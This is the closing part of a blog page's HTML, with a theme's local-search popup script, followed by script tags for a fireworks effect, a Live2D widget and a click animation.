                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  



   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
   <script type="text/javascript" src="/js/src/fireworks.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>

<!-- ҳ����С���� -->
<script type="text/javascript" src="/js/src/clicklove.js"></script>

